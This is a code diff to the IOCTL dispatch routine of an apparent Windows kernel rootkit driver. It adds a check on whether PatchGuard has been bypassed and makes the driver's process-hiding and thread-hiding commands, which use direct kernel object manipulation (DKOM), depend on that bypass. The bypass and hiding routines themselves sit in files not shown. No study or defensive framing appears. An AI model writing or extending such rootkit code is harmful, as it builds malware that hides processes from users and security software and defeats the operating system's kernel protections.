@@ -1,6 +1,7 @@
 #include "Dispatch.h"
 #include "ProcessModule.h"
 #include "ThreadModule.h"
+#include "Bypass.h"
 #include "Shared.h"
 #include <ntddk.h>
 
@@ -83,10 +84,29 @@ NTSTATUS DispatchDeviceControl(PDEVICE_OBJECT DeviceObject, PIRP Irp) {
     break;
 
   // ------------------------------------------------------
+  // GET_PG_STATUS
+  // ------------------------------------------------------
+  case IOCTL_GET_PG_STATUS:
+    DbgPrint("GET_PG_STATUS called\n");
+    if (outputLength >= sizeof(DRIVER_RESPONSE)) {
+      PDRIVER_RESPONSE response = (PDRIVER_RESPONSE)outputBuffer;
+      response->Status = STATUS_SUCCESS;
+      response->Data = g_PatchGuardBypassed ? 1 : 0;
+      bytesReturned = sizeof(DRIVER_RESPONSE);
+    } else {
+      status = STATUS_BUFFER_TOO_SMALL;
+    }
+    break;
+
+  // ------------------------------------------------------
   // Process DKOM module (see ProcessModule.c)
   // ------------------------------------------------------
   case IOCTL_HIDE_PROCESS:
     DbgPrint("HIDE_PROCESS requested.\n");
+    if (!g_PatchGuardBypassed) {
+      status = STATUS_NOT_SUPPORTED;
+      break;
+    }
     if (inputLength == sizeof(PROCESS_REQUEST)) {
       PPROCESS_REQUEST req = (PPROCESS_REQUEST)inputBuffer;
       status = ProcessHide(req->ProcessId);
@@ -98,6 +118,10 @@ NTSTATUS DispatchDeviceControl(PDEVICE_OBJECT DeviceObject, PIRP Irp) {
 
   case IOCTL_UNHIDE_PROCESS:
     DbgPrint("UNHIDE_PROCESS requested.\n");
+    if (!g_PatchGuardBypassed) {
+      status = STATUS_NOT_SUPPORTED;
+      break;
+    }
     if (inputLength == sizeof(PROCESS_REQUEST)) {
       PPROCESS_REQUEST req = (PPROCESS_REQUEST)inputBuffer;
       status = ProcessUnhide(req->ProcessId);
@@ -122,6 +146,10 @@ NTSTATUS DispatchDeviceControl(PDEVICE_OBJECT DeviceObject, PIRP Irp) {
   // ------------------------------------------------------
   case IOCTL_HIDE_THREAD:
     DbgPrint("HIDE_THREAD requested.\n");
+    if (!g_PatchGuardBypassed) {
+      status = STATUS_NOT_SUPPORTED;
+      break;
+    }
     if (inputLength == sizeof(THREAD_REQUEST)) {
       PTHREAD_REQUEST req = (PTHREAD_REQUEST)inputBuffer;
       status = ThreadHide(req->ThreadId);
@@ -133,6 +161,10 @@ NTSTATUS DispatchDeviceControl(PDEVICE_OBJECT DeviceObject, PIRP Irp) {
 
   case IOCTL_UNHIDE_THREAD:
     DbgPrint("UNHIDE_THREAD requested.\n");
+    if (!g_PatchGuardBypassed) {
+      status = STATUS_NOT_SUPPORTED;
+      break;
+    }
     if (inputLength == sizeof(THREAD_REQUEST)) {
       PTHREAD_REQUEST req = (PTHREAD_REQUEST)inputBuffer;
       status = ThreadUnhide(req->ThreadId);
